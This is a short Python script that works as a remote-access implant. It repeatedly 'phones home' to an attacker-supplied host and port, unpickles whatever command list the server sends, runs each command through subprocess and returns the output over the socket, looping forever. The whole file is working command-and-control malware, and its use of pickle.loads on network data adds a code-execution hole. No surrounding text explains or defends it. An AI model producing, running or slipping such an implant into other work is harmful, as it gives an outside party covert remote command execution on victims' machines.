#!/usr/bin/python3

# Standard libraries only
import sys
import socket
import subprocess
import time
import pickle


# Display script usage if not given correct number of arguments.
if len(sys.argv) != 4:
    print("usage:", sys.argv[0], "<rhost> <rport> <wait>")
    sys.exit(1)

# Initialize global variables.
rhost, rport, wait = sys.argv[1:4]
wait = int(wait)
rserver = (rhost, int(rport))


def phone_home():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(rserver)
    except socket.error:
        print("Dad isn't home")
    else:
        data = s.recv(1024)
        cmd = pickle.loads(data)
        for c in cmd:
            cmdarg = (c).split(" ")
            try:
                execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            except:
                FileNotFoundError
            else:
                cmd_return = (str(c) + "\n" + str(execute.stdout))
                s.sendall(bytes(cmd_return, "utf-8"))
    s.close
    return

# Run the function forever.
while True:
    phone_home()
    time.sleep(wait)